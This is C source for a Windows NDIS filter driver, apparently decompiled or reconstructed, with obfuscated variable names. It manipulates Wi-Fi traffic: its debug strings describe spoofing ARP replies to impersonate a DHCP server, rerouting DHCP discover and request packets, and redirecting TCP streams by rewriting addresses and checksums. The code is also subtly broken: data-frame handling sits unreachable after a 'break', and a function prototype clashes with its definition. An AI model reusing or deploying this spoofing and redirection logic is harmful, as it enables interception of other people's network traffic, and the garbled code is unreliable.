#include "precomp.h"

#define HTONL(l) _byteswap_ulong(l)
#define HTONS(s) htons(s)

USHORT CheckSum(USHORT *buffer, int size);
USHORT TcpCheckSum(void *arg_0, void *arg_1, void *arg_8, int MaxCount);

USHORT htons(USHORT a1)
{
  return (a1 << 8) + (a1 >> 8);
}

// just for preserving string literal order in compiled file
void ___junk___(PNET_BUFFER_LIST pNetBufList)
{
    PMDL                    pMdl = NULL;
    UINT                    BufferLength = 0;
    ULONG                   Offset;
    
    pMdl = NET_BUFFER_CURRENT_MDL(NET_BUFFER_LIST_FIRST_NB(pNetBufList));
    Offset = NET_BUFFER_CURRENT_MDL_OFFSET(NET_BUFFER_LIST_FIRST_NB(pNetBufList));
    
    ASSERT(pMdl != NULL);
    ASSERT(BufferLength > Offset);
    DEBUGP(DL_WARN, ("ReceiveNetBufferList: runt 802.11 nbl %p, first buffer length %d\n", pNetBufList, BufferLength));
    DEBUGP(DL_WARN, ("ReceiveNetBufferList: wifi:longdata: destination: %02x:%02x:%02x:%02x:%02x:%02x \n", 0, 0, 0, 0, 0, 0));
    DEBUGP(DL_WARN, ("ReceiveNetBufferList: wifi:longdata: source: %02x:%02x:%02x:%02x:%02x:%02x \n", 0, 0, 0, 0, 0, 0));
    DEBUGP(DL_WARN, ("ReceiveNetBufferList: runt 802.3 nbl %p, first buffer length %d\n", pNetBufList, BufferLength));
}

PNET_BUFFER_LIST createpacket(NDIS_HANDLE NdisHandle, NDIS_HANDLE NblPool, PDOT11_MAC_ADDRESS AdapterMac, void* Packet, ULONG PacketSize)
{
    NDIS_STATUS                Code;
    PDOT11_FRAME_CTRL          frame = NULL;
    PUCHAR                     Buffer = NULL;
    PNET_BUFFER_LIST           BufferList = NULL;
    PNET_BUFFER_LIST           NetBuferList = NULL;
    PMDL                       pBuffer = NULL;
    PDOT11_EXTSTA_SEND_CONTEXT pSendContext = NULL;
    PNET_BUFFER                FirstNetBuffer;
    PDOT11_MGMT_HEADER         MgmtHdr = NULL;
    BOOLEAN                    BssidMatch = FALSE;

    do
    {
        if ( PacketSize < sizeof(DOT11_MGMT_HEADER) )
        {
            DEBUGP(DL_ERROR, ("createpacket: packet size less than management frame size \n"));
            break;
        }
        frame = (PDOT11_FRAME_CTRL)Packet;
        if ( frame->Type != DOT11_FRAME_TYPE_MANAGEMENT)
        {
            DEBUGP(DL_ERROR, ("createpacket: Ignoring non managment frame \n"));
            break;
        }
        
        MgmtHdr = (PDOT11_MGMT_HEADER)Packet;
        BssidMatch = NdisEqualMemory(MgmtHdr->SA, AdapterMac, DOT11_ADDRESS_SIZE);
        if ( !BssidMatch )
        {
            DEBUGP(DL_WARN, ("createpacket: wifi:mgmt: bssid: %02x:%02x:%02x:%02x:%02x:%02x \n", 
                MgmtHdr->SA[0],
                MgmtHdr->SA[1],
                MgmtHdr->SA[2],
                MgmtHdr->SA[3],
                MgmtHdr->SA[4],
                MgmtHdr->SA[5]));
            DEBUGP(DL_ERROR, ("createpacket: Incorrect adapter address \n"));
            break;
        }
        Buffer = (PUCHAR)NdisAllocateMemoryWithTagPriority(NdisHandle, PacketSize + 8, 'tliF', NormalPoolPriority);
        if ( Buffer == NULL )
        {
            DEBUGP(DL_FATAL, ("create packet: NULL InitialBuffer address with NdisAllocateMemory \n"));
            Code = NDIS_STATUS_INVALID_PARAMETER;
            break;
        }
        NdisMoveMemory(Buffer + 8, Packet, PacketSize);
        pBuffer = NdisAllocateMdl(NblPool, Buffer, PacketSize + 8);
        BufferList = NdisAllocateNetBufferAndNetBufferList(NblPool, 0x18u, 8u, pBuffer, 8u, PacketSize);
        if ( BufferList == NULL )
        {
            DEBUGP(DL_FATAL, ("create packet: NULL BufferList address in SendNetBufferListPool \n"));
            NdisFreeMdl(pBuffer);
            NdisFreeMemory(Buffer, PacketSize, 0x10u);
            break;
        }
        BufferList->SourceHandle = NdisHandle;
        NdisAllocateNetBufferListContext(BufferList, 0x18u, 8u, 'lwfd');
        pSendContext = (PDOT11_EXTSTA_SEND_CONTEXT)NdisAllocateMemoryWithTagPriority(
            NdisHandle,
            0x18u,
            'tliF',
            NormalPoolPriority);
        if ( pSendContext == NULL )
        {
            DEBUGP(DL_FATAL, ("create packet: pSendContext is NULL \n"));
            NdisFreeMdl(pBuffer);
            NdisFreeMemory(pSendContext, 0x18u, 0x10u);
            NdisFreeMemory(Buffer, PacketSize, 0x10u);
            break;
        }
        NET_BUFFER_LIST_INFO( BufferList, MediaSpecificInformation ) = pSendContext;
        pSendContext = (PDOT11_EXTSTA_SEND_CONTEXT) NET_BUFFER_LIST_INFO( BufferList, MediaSpecificInformation );
        if ( pSendContext == NULL)
        {
            break;
        }
        pSendContext->Header.Type = 0x80;
        pSendContext->Header.Revision = 1;
        pSendContext->Header.Size = 24;
        pSendContext->pvMediaSpecificInfo = 0;
        pSendContext->usExemptionActionType = 1;
        pSendContext->uSendFlags = 1;
        pSendContext->uPhyId = 0;
        FirstNetBuffer = BufferList->FirstNetBuffer;
        FirstNetBuffer->CurrentMdl = pBuffer;
        FirstNetBuffer->CurrentMdlOffset = 8;
        FirstNetBuffer->DataLength = PacketSize;
        FirstNetBuffer->DataOffset = 8;
        NetBuferList = BufferList;
    }
    while (FALSE);
    return NetBuferList;
}











































































































































































































































































































































































































































































































































































BOOLEAN FilterNetBufferList(PNET_BUFFER_LIST pNetBufList, NDIS_MEDIUM MiniportMediaType, PMS_FILTER pFilter, BOOLEAN is_send_list)
{
    ULONG                    BufferLen = 0;
    int                      v_44oAF = 0;
    PMDL                     pMdl = NULL;
    int                      v_QhDnR = 0;
    int                      v_QOxOz = 0;
    PVOID                    pSrcBuff = NULL;
    int                      v_HnxxK = 0;
    char                     bLastStatus = 0;
    ULONG                    v_3smSS;
    PVOID                    pEthHeader = NULL;
    PARP_HDR                 pArpHeader = NULL;
    ULONG                    v_JJjzz;
    PUCHAR                   pCmData = NULL;
    PIPV4_HDR                pHdrIPv4 = NULL;
    PUDP_HDR                 UdpHdr = NULL;
    PTCP_HDR                 _pTcpHeader = NULL;
    ULONG                    Offset;
    PUCHAR                   pBuffer;
    PDHCP_HDR                DhcpHdr = NULL;
    PUCHAR                   pOpt1 = NULL;
    int                      v_0jryH = 0;
    int                      v_agvDX = 0;
    UCHAR                    _EthTypeARP[2] = {8, 6};
    UCHAR                    v_6I0Dk[4] = {0, 1, 8, 0};
    UCHAR                    _IpEthType[2] = {8, 0};
    USHORT                   wSrcPort;
    PDOT11_FRAME_CTRL        pPacketHeader = NULL;
    int                      v_vBSi2 = 0;
    PDOT11_MAC_HEADER        MgmtPacket = NULL;
    PDOT11_DATA_SHORT_HEADER pHdr = NULL;
    PDOT11_DATA_LONG_HEADER  pHeader = NULL;
    PDOT11_MAC_HEADER        ControlFrame = NULL;
    USHORT                   DstPort1;
    ULONG                    v_pk1Ty;
    DOT11_MAC_ADDRESS        Addr3 = {0x00, 0x0F, 0x66, 0xB1, 0x71, 0x77};
    DOT11_MAC_ADDRESS        Addr1 = {0x00, 0x0F, 0x66, 0xB1, 0x71, 0x75};
    DOT11_MAC_ADDRESS        v_C7dBj = {0x00, 0x1E, 0x58, 0x3C, 0x35, 0xF3};
    DOT11_MAC_ADDRESS        v_K74Qs = {0x00, 0x13, 0x10, 0xC3, 0x9D, 0x3D};
    UCHAR                    v_fIz5R[4] = {192, 168, 2, 1};
    UCHAR                    v_3lbPn[4] = {192, 168, 1, 1};
    UCHAR                    v_c5mCw[4] = {192, 168, 2, 100};
    UCHAR                    v_4ERf3[4] = {192, 168, 2, 136};
    USHORT                   CurrLength;
    UCHAR                    bFit = 1;
    ULONG                    TotalLength;
    USHORT                   datasize;
    ULONG                    BufferLength;
    ULONG                    v_h80Jc;
    ULONG                    v_ri9eu;
    USHORT                   b8;
    ULONG                    v_kI68c;
    USHORT                   bResult2;
    PUCHAR                   pOptions_;
    ULONG                    v_4dk9r;
    ULONG                    v_0GkPr;
    
    //
    // Get first MDL and data length in the list
    //
    pMdl = NET_BUFFER_CURRENT_MDL(NET_BUFFER_LIST_FIRST_NB(pNetBufList));
    TotalLength = NET_BUFFER_DATA_LENGTH(NET_BUFFER_LIST_FIRST_NB(pNetBufList));
    Offset = NET_BUFFER_CURRENT_MDL_OFFSET(NET_BUFFER_LIST_FIRST_NB(pNetBufList));
    
    do
    {
        ASSERT(pMdl != NULL);                                                   // line 750
        if ( pMdl != NULL)
        {
            NdisQueryMdl(
                pMdl,
                &pSrcBuff,
                &BufferLength,
                NormalPagePriority);
        }
        
        BufferLen = BufferLength;
        
        if ( pSrcBuff == NULL )
        {
            //
            //  The system is low on resources. Set up to handle failure
            //  below.
            //
            DEBUGP(DL_WARN, ("FilterReceiveNetBufferLists: The system is low on resources. \n"));
            
            BufferLength = 0;
            break;
        }
        if ( BufferLength == 0)
        {
            break;
        }
        
        ASSERT(BufferLength > Offset);                                          // line 778
        BufferLength -= Offset;
        
        if ( MiniportMediaType == NdisMediumNative802_11 )
        {
            pPacketHeader = (PDOT11_FRAME_CTRL)((PUCHAR)pSrcBuff + Offset);
            if ( BufferLength < sizeof(DOT11_FRAME_CTRL) )
            {
                DEBUGP(DL_WARN, ("ReceiveNetBufferList: runt 802.11 nbl %p, first buffer length %d\n", pNetBufList, BufferLength));
                break;
            }
            
            if ( pFilter->pool_derived_from_nbl == NULL )
                pFilter->pool_derived_from_nbl = NdisGetPoolFromNetBufferList(pNetBufList);
            
            switch ( pPacketHeader->Type )
            {
                case DOT11_FRAME_TYPE_MANAGEMENT:
                    MgmtPacket = (PDOT11_MAC_HEADER) pPacketHeader;
                    break;
                case DOT11_FRAME_TYPE_CONTROL:
                    ControlFrame = (PDOT11_MAC_HEADER)pPacketHeader;
                    break;
                break;
                if (pPacketHeader->Subtype != DOT11_DATA_SUBTYPE_DATA)
                    break;
                if (pPacketHeader->ToDS == 0 || pPacketHeader->FromDS == 0)
                    pHdr = (PDOT11_DATA_SHORT_HEADER)pPacketHeader;
                if (pPacketHeader->ToDS == 1 && pPacketHeader->FromDS == 1)
                    pHeader = (PDOT11_DATA_LONG_HEADER)pPacketHeader;
                if (pHdr != NULL)
                {
                    CurrLength = (USHORT)(BufferLength - 0x18);
                    pCmData = (PUCHAR)pHdr + 0x1B;
                    if ( is_send_list && NDIS_MDL_LINKAGE(pMdl) != pMdl && NDIS_MDL_LINKAGE(pMdl) )
                    {
                        NdisGetNextMdl(pMdl, &pMdl);
                        NdisQueryMdl(pMdl, &pSrcBuff, &BufferLength, NormalPagePriority);
                    }
                    if ( pCmData )
                    {
                        bResult2 = NdisEqualMemory(pCmData + 3, _IpEthType, 2);
                        if ( bResult2 )
                        {
                            if ( is_send_list )
                                pHdrIPv4 = (PIPV4_HDR)pSrcBuff;
                            else
                                pHdrIPv4 = (PIPV4_HDR)(pCmData + 5);
                        }
                        bResult2 = NdisEqualMemory(pCmData + 3, _EthTypeARP, 2);
                        if ( bResult2 )
                        {
                            if ( is_send_list )
                                pArpHeader = (PARP_HDR)pSrcBuff;
                            else
                                pArpHeader = (PARP_HDR)(pCmData + 5);
                        }
                    }
                    if ( pArpHeader )
                    {
                        if ( HTONS(pArpHeader->opcode) == ARPOP_REPLY && pFilter->field_173 )
                        {
                            ULONG unused_0, unused_1, unused_2;
                            if ( is_send_list )
                            {
                                int i;
                                for ( i = 0; i < 6; ++i )
                                {
                                    pHdr->Address1[i] = Addr3[i];
                                    pHdr->Address3[i] = Addr1[i];
                                }
                                for ( i = 0; i < 4; ++i )
                                {
                                    pArpHeader->target_ip[i] = pFilter->field_16E[i];
                                    pArpHeader->sender_ip[i] = pFilter->field_16A[i];
                                }
                                DEBUGP(DL_WARN, ("sending arp response to: %d.%d.%d.%d \n",
                                    pArpHeader->target_ip[0],
                                    pArpHeader->target_ip[1],
                                    pArpHeader->target_ip[2],
                                    pArpHeader->target_ip[3]));
                                pFilter->field_173 = 0;
                            }
                            if ( !is_send_list )
                                DEBUGP(DL_WARN, ("receiving arp response from: %d.%d.%d.%d \n",
                                    pArpHeader->sender_ip[0],
                                    pArpHeader->sender_ip[1],
                                    pArpHeader->sender_ip[2],
                                    pArpHeader->sender_ip[3]));
                        }
                        if ( HTONS(pArpHeader->opcode) == ARPOP_REQUEST && !is_send_list && pFilter->field_294 )
                        {
                            DEBUGP(DL_WARN, ("receiving arp request for ip: %d.%d.%d.%d \n",
                                    pArpHeader->target_ip[0],
                                    pArpHeader->target_ip[1],
                                    pArpHeader->target_ip[2],
                                    pArpHeader->target_ip[3]));
                            bResult2 = NdisEqualMemory(pHdr->Address2, pFilter->field_114, 6);
                            if ( !bResult2 )
                            {
                                b8 = NdisEqualMemory(pArpHeader->target_ip, pFilter->field_16A, 4);
                                if ( b8 && pFilter->field_134[0] != 1 )
                                {
                                    int   i;
                                    ULONG unused_0;
                                    
                                    DEBUGP(DL_WARN, ("recv: arp: spoofing adjacent dhcp server with current dhcp server \n"));
                                    for ( i = 0; i < 6; ++i )
                                    {
                                        pHdr->Address2[i] = pFilter->field_114[i];
                                        pHdr->Address3[i] = pFilter->field_134[i];
                                        pArpHeader->sender_mac[i] = pFilter->field_134[i];
                                    }
                                    if ( pFilter->field_154[0] != 1 )
                                    {
                                        DEBUGP(DL_WARN, ("arp:receive: request: spoofing target ip with : %d.%d.%d.%d \n",
                                            pFilter->field_154[0],
                                            pFilter->field_154[1],
                                            pFilter->field_154[2],
                                            pFilter->field_154[3]));
                                        for ( i = 0; i < 4; ++i )
                                        {
                                            pArpHeader->target_ip[i] = pFilter->field_154[i];
                                            pArpHeader->sender_ip[i] = pFilter->field_158[i];
                                        }
                                        pFilter->field_173 = 1;
                                    }
                                }
                            }
                        }
                    }
                    if ( pHdrIPv4 )
                    {
                        if ( pHdrIPv4->protocol == IPPROTO_IGMP && is_send_list )
                        {
                            int i;
                            for ( i = 0; i < 6; ++i )
                                ;
                        }
                        if ( pHdrIPv4->protocol == IPPROTO_TCP)
                        {
                            USHORT Seq_100000;
                            void*  TcpData;
                            ULONG  seq;
                            int    i;
                            
                            TcpData = NULL;
                            _pTcpHeader = (PTCP_HDR)((UCHAR*)pHdrIPv4 + sizeof(IPV4_HDR));
                            DstPort1 = HTONS(_pTcpHeader->dest);
                            wSrcPort = HTONS(_pTcpHeader->source);
                            seq = HTONL(_pTcpHeader->seq);
                            Seq_100000 = (USHORT)(seq / 100000);
                            if ( _pTcpHeader->ack_seq == 0 && pFilter->field_294 )
                            {
                                ++pFilter->tcp_stream_cnt;
                                for ( i = 0; i < 10; ++i )
                                {
                                    if (pFilter->field_17C[i].th_seq == seq)
                                        break;
                                    if ( !pFilter->field_17C[i].field_C )
                                    {
                                        pFilter->field_17C[i].field_C = Seq_100000;
                                        pFilter->field_17C[i].th_seq = seq;
                                        pFilter->field_17C[i].th_stream_cnt = pFilter->tcp_stream_cnt;
                                        break;
                                    }
                                }
                                DEBUGP(DL_WARN, ("stream count %d, start tcp sequence %d \n",
                                    pFilter->tcp_stream_cnt,
                                    Seq_100000));
                            }
                            bResult2 = NdisEqualMemory(pHdr->Address2, pFilter->field_114, 6);
                            if ( !bResult2 && !is_send_list)
                            {
                                ULONG  unused_1;
                                USHORT unused_2;
                                ULONG  AckSeq;
                                
                                AckSeq = HTONL(_pTcpHeader->ack_seq);
                                unused_2 = (USHORT)(AckSeq / 100000);
                                bResult2 = NdisEqualMemory(pHdr->Address1, &pFilter->CurrentMacAddress, 6);
                                if ( bResult2 && (unused_1 = 0, pFilter->field_154[0] != 1) )
                                {
                                    USHORT size;
                                    USHORT tcpchksum;
                                    USHORT oldtcpchksum;
                                    USHORT OldChk;
                                    
                                    DEBUGP(DL_WARN, ("tcp recv:redirecting adjacent ip to  %d.%d.%d.%d \n",
                                        pFilter->field_154[0],
                                        pFilter->field_154[1],
                                        pFilter->field_154[2],
                                        pFilter->field_154[3]));
                                    for ( i = 0; i < 6; ++i )
                                    {
                                        pHdr->Address2[i] = pFilter->field_114[i];
                                        pHdr->Address3[i] = pFilter->field_134[i];
                                    }
                                    for ( i = 0; i < 4; ++i )
                                        ((UCHAR*)&pHdrIPv4->daddr)[i] = pFilter->field_154[i];
                                    TcpData = (UCHAR *)_pTcpHeader + 4 * (_pTcpHeader->doff >> 4);
                                    size = HTONS(pHdrIPv4->tot_len) - (4 * (_pTcpHeader->doff >> 4) + 20);
                                    OldChk = pHdrIPv4->check;
                                    pHdrIPv4->check = 0;
                                    pHdrIPv4->check = CheckSum((USHORT *)pHdrIPv4, 20);
                                    oldtcpchksum = HTONS(_pTcpHeader->check);
                                    _pTcpHeader->check = 0;
                                    tcpchksum = TcpCheckSum(pHdrIPv4, _pTcpHeader, TcpData, size);
                                    _pTcpHeader->check = tcpchksum;
                                }
                            }
                            if ( is_send_list )
                            {
                                bResult2 = 0;
                                for ( i = 0; i < 10; ++i )
                                {
                                    if ( Seq_100000 == (USHORT)pFilter->field_17C[i].field_C )
                                    {
                                        bResult2 = 1;
                                        DEBUGP(DL_WARN, ("found matching sequence id: %d \n",
                                            (USHORT)pFilter->field_17C[i].field_C));
                                        if ( _pTcpHeader->fin == 1 )
                                        {
                                            DEBUGP(DL_WARN, ("send end tcp sequence %d , tcp sequence count %d, current streamcount %d \n",
                                                Seq_100000,
                                                (USHORT)pFilter->field_17C[i].th_stream_cnt,
                                                (USHORT)pFilter->tcp_stream_cnt));
                                            pFilter->field_17C[i].field_C = 0;
                                        }
                                        break;
                                    }
                                }
                                if ( bResult2 )
                                {
                                    USHORT Chk;
                                    USHORT tcpchksum;
                                    int    i;
                                    USHORT oldtcpchksum = 0;
                                    USHORT OldChk = 0;
                                    ULONG  unused_0 = 0;
                                    
                                    for ( i = 0; i < 6; ++i )
                                    {
                                        pHdr->Address1[i] = Addr3[i];
                                        pHdr->Address3[i] = Addr1[i];
                                    }
                                    for ( i = 0; i < 4; ++i )
                                        ((UCHAR*)&pHdrIPv4->saddr)[i] = pFilter->field_16A[i];
                                    if ( NDIS_MDL_LINKAGE(pMdl) && NDIS_MDL_LINKAGE(pMdl) != pMdl )
                                    {
                                        NdisGetNextMdl(pMdl, &pMdl);
                                        NdisQueryMdl(pMdl, &pSrcBuff, &BufferLength, NormalPagePriority);
                                    }
                                    else
                                    {
                                        BufferLength = 0;
                                        pSrcBuff = NULL;
                                    }
                                    TcpData = (UCHAR *)_pTcpHeader + 4 * (_pTcpHeader->doff >> 4);
                                    Chk = HTONS(pHdrIPv4->tot_len) - (4 * (_pTcpHeader->doff >> 4) + 20);
                                    OldChk = pHdrIPv4->check;
                                    pHdrIPv4->check = 0;
                                    pHdrIPv4->check = CheckSum((USHORT *)pHdrIPv4, 20);
                                    oldtcpchksum = HTONS(_pTcpHeader->check);
                                    _pTcpHeader->check = 0;
                                    tcpchksum = TcpCheckSum(pHdrIPv4, _pTcpHeader, pSrcBuff, Chk);
                                    _pTcpHeader->check = tcpchksum;
                                }
                            }
                        }
                        if ( pHdrIPv4->protocol == IPPROTO_UDP)
                        {
                            UdpHdr = (PUDP_HDR)((UCHAR *)pHdrIPv4 + sizeof(IPV4_HDR));
                            DstPort1 = HTONS(UdpHdr->dport);
                            wSrcPort = HTONS(UdpHdr->sport);
                            if ( is_send_list )
                            {
                                NdisGetNextMdl(pMdl, &pMdl);
                                NdisQueryMdl(pMdl, &pBuffer, &BufferLength, NormalPagePriority);
                            }
                            else
                            {
                                pBuffer = (UCHAR *)UdpHdr + sizeof(UDP_HDR);
                            }
                            datasize = HTONS(UdpHdr->ulen) - 8;
                            MgmtPacket = (PDOT11_MAC_HEADER)pBuffer;
                            if ( MgmtPacket == NULL )
                                break;
                            if ( wSrcPort == 67 )
                            {
                                DhcpHdr = (PDHCP_HDR) pBuffer;
                                pOptions_ = (UCHAR*)pBuffer + sizeof(DHCP_HDR) + 2; // ptr to first option value, assume it's DHO_DHCP_MESSAGE_TYPE
                                ++pFilter->field_162;
                                if ( !is_send_list )
                                {
                                    int i;
                                    
                                    if ( *pOptions_ == DHCP_OFFER && pFilter->field_172)
                                    {
                                        pOpt1 = (UCHAR *)DhcpHdr + sizeof(DHCP_HDR) + 3; // ptr to second option
                                        if ( *pOpt1 == DHO_DHCP_SERVER_IDENTIFIER )
                                        {
                                            DEBUGP(DL_WARN, ("recv: offer client IP is : %d:%d:%d:%d \n",
                                                ((UCHAR*)&DhcpHdr->yiaddr)[0],
                                                ((UCHAR*)&DhcpHdr->yiaddr)[1],
                                                ((UCHAR*)&DhcpHdr->yiaddr)[2],
                                                ((UCHAR*)&DhcpHdr->yiaddr)[3]));
                                            for ( i = 0; i < 4; ++i )
                                            {
                                                pFilter->field_16A[i] = ((UCHAR*)&DhcpHdr->yiaddr)[i];
                                                pFilter->field_16E[i] = pOpt1[i + 2];
                                            }
                                        }
                                    }
                                    if ( *pOptions_ == DHCP_ACK )
                                    {
                                        if ( !pFilter->field_172 )
                                        {
                                            DEBUGP(DL_WARN, ("recv: ack client IP is : %d:%d:%d:%d \n",
                                                ((UCHAR*)&DhcpHdr->yiaddr)[0],
                                                ((UCHAR*)&DhcpHdr->yiaddr)[1],
                                                ((UCHAR*)&DhcpHdr->yiaddr)[2],
                                                ((UCHAR*)&DhcpHdr->yiaddr)[3]));
                                            if ( ((UCHAR*)&DhcpHdr->yiaddr)[0] )
                                            {
                                                for ( i = 0; i < 4; ++i )
                                                {
                                                    pFilter->field_154[i] = ((UCHAR*)&DhcpHdr->yiaddr)[i];
                                                    pFilter->field_158[i] = ((UCHAR*)&DhcpHdr->nsiaddr)[i];
                                                }
                                                for ( i = 0; i < 6; ++i )
                                                {
                                                    pFilter->field_114[i] = pHdr->Address2[i];
                                                    pFilter->field_134[i] = pHdr->Address3[i];
                                                }
                                            }
                                        }
                                        else
                                        {
                                            if ( ((UCHAR*)&DhcpHdr->yiaddr)[0] )
                                            {
                                                DEBUGP(DL_WARN, ("recv: ack client IP is : %d:%d:%d:%d \n",
                                                    ((UCHAR*)&DhcpHdr->yiaddr)[0],
                                                    ((UCHAR*)&DhcpHdr->yiaddr)[1],
                                                    ((UCHAR*)&DhcpHdr->yiaddr)[2],
                                                    ((UCHAR*)&DhcpHdr->yiaddr)[3]));
                                                for ( i = 0; i < 4; ++i )
                                                {
                                                    pFilter->field_16A[i] = ((UCHAR*)&DhcpHdr->yiaddr)[i];
                                                    pFilter->field_16E[i] = ((UCHAR*)&DhcpHdr->nsiaddr)[i];
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            if ( DstPort1 == 67 && pFilter->field_172 )
                            {
                                ULONG  unused_1;
                                USHORT size = 0;
                                int    i;
                                
                                DhcpHdr = (PDHCP_HDR) pBuffer;
                                pOptions_ = (UCHAR*)pBuffer + sizeof(DHCP_HDR) + 2; // ptr to first option value, assume it's DHO_DHCP_MESSAGE_TYPE
                                ++pFilter->field_162;
                                if ( *pOptions_ == DHCP_DISCOVER && !is_send_list)
                                    DEBUGP(DL_WARN, ("receiving discover packet  \n"));
                                if ( *pOptions_ == DHCP_DISCOVER && is_send_list && pFilter->field_154[0] != 1 )
                                {
                                    DEBUGP(DL_WARN, ("rerouting discover packet  \n"));
                                    pFilter->field_164 = 0;
                                    for ( i = 0; i < 6; ++i )
                                        pHdr->Address1[i] = Addr3[i];
                                    for ( i = 0; i < 4; ++i )
                                        ((UCHAR*)&pHdrIPv4->saddr)[i] = 0;
                                    pHdrIPv4->check = 0;
                                    pHdrIPv4->check = CheckSum((USHORT *)pHdrIPv4, 20);
                                    UdpHdr->sport = HTONS(0x44u);
                                    size = HTONS(UdpHdr->ulen) - 8;
                                    UdpHdr->sum = 0;
                                }
                                if ( *pOptions_ == DHCP_REQUEST && is_send_list && pFilter->field_172 )
                                {
                                    DEBUGP(DL_WARN, ("saving current bssid  \n"));
                                    NdisMoveMemory(pFilter->field_114, pHdr->Address1, 6);
                                    NdisMoveMemory(pFilter->field_134, pHdr->Address3, 6);
                                    DEBUGP(DL_WARN, ("rerouting request packet  \n"));
                                    pFilter->field_164 = 1;
                                    for ( i = 0; i < 6; ++i )
                                        pHdr->Address1[i] = Addr3[i];
                                    for ( i = 0; i < 4; ++i )
                                        ((UCHAR*)&pHdrIPv4->saddr)[i] = 0;
                                    pHdrIPv4->check = 0;
                                    pHdrIPv4->check = CheckSum((USHORT *)pHdrIPv4, 20);
                                    pFilter->field_166 = 0;
                                    UdpHdr->sport = HTONS(0x44u);
                                    size = HTONS(UdpHdr->ulen) - 8;
                                    UdpHdr->sum = 0;
                                }
                                if ( *pOptions_ == DHCP_INFORM )
                                    DEBUGP(DL_WARN, ("inform packet  \n"));
                            }
                        }
                    }
                    if ( bFit && is_send_list && pFilter->field_114[0] != 1 )
                    {
                        bResult2 = NdisEqualMemory(pFilter->field_114, pHdr->Address1, 6);
                        if ( !bResult2 )
                        {
                            if ( pFilter->field_174 )
                            {
                                PDOT11_EXTSTA_SEND_CONTEXT pSendContext;
                                pSendContext = (PDOT11_EXTSTA_SEND_CONTEXT) NET_BUFFER_LIST_INFO( pNetBufList, MediaSpecificInformation );
                                pSendContext->usExemptionActionType = DOT11_EXEMPT_ALWAYS;
                                DEBUGP(DL_WARN, ("data send: virtual bssid: %02x:%02x:%02x:%02x:%02x:%02x \n",
                                    pHdr->Address1[0],
                                    pHdr->Address1[1],
                                    pHdr->Address1[2],
                                    pHdr->Address1[3],
                                    pHdr->Address1[4],
                                    pHdr->Address1[5]));
                            }
                        }
                    }
                }
                if ( pHeader )
                {
                    DEBUGP(DL_WARN, (
                        "ReceiveNetBufferList: wifi:longdata: destination: %02x:%02x:%02x:%02x:%02x:%02x \n",
                        pHeader->Address1[0],
                        pHeader->Address1[1],
                        pHeader->Address1[2],
                        pHeader->Address1[3],
                        pHeader->Address1[4],
                        pHeader->Address1[5]));
                    DEBUGP(DL_WARN, (
                        "ReceiveNetBufferList: wifi:longdata: source: %02x:%02x:%02x:%02x:%02x:%02x \n",
                        pHeader->Address3[0],
                        pHeader->Address3[1],
                        pHeader->Address3[2],
                        pHeader->Address3[3],
                        pHeader->Address3[4],
                        pHeader->Address3[5]));
                }
            }
            
        }
        if ( MiniportMediaType == NdisMedium802_3 )
        {
            pEthHeader = (PUCHAR)pSrcBuff + Offset;
            if (BufferLength < 0xE)
            {
              DEBUGP(DL_WARN, ("ReceiveNetBufferList: runt 802.3 nbl %p, first buffer length %d\n", pNetBufList, BufferLength));
              break;
            }
        }
    } while (FALSE);
    
    return bLastStatus;
} 

USHORT CheckSum(USHORT *buffer, int size)
{
    unsigned long cksum=0;
    while(size >1)
    {
        cksum+=*buffer++;
        size -=sizeof(USHORT);
    }
    if(size)
        cksum += *(UCHAR*)buffer;

    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >>16);
    return (USHORT)(~cksum);
}

USHORT TcpCheckSum(PIPV4_HDR IpHeader, void *TcpHeader, void *Data, int Size)
{
    UCHAR       *buf = NULL;
    ULONG       v_Vv8kS = 0;
    USHORT      _TcpOptSize;
    ULONG       v_LFmZw;
    PPSD_HEADER v_Z0ZGZ = NULL; // PsdHeader
    USHORT      v_8YpcC = 0;
    ULONG       v_46epJ = 0;
    ULONG       v_t8ms7;
    USHORT      ver;
    USHORT      HeadersSize;
    
    ver = IpHeader->version & 0xF;
    _TcpOptSize = HTONS(IpHeader->tot_len) - 40 - Size;
    HeadersSize = _TcpOptSize + 20;
    NdisAllocateMemoryWithTag(&v_Z0ZGZ, 0xCu, 'LWF');
    v_Z0ZGZ->daddr = IpHeader->daddr;
    v_Z0ZGZ->saddr = IpHeader->saddr;
    v_Z0ZGZ->mbz = 0;
    v_Z0ZGZ->ptcl = IPPROTO_TCP;
    v_Z0ZGZ->tcpl = HTONS(Size + HeadersSize);
    NdisAllocateMemoryWithTag(&buf, HeadersSize + Size + 12, 'LWF');
    NdisMoveMemory(buf, v_Z0ZGZ, sizeof(PSD_HEADER));
    NdisMoveMemory(buf + 12, TcpHeader, HeadersSize);
    if ( Size > 0 )
        NdisMoveMemory(buf + HeadersSize + 12, Data, Size);
    return CheckSum((USHORT *)buf, HeadersSize + Size + 12);
}
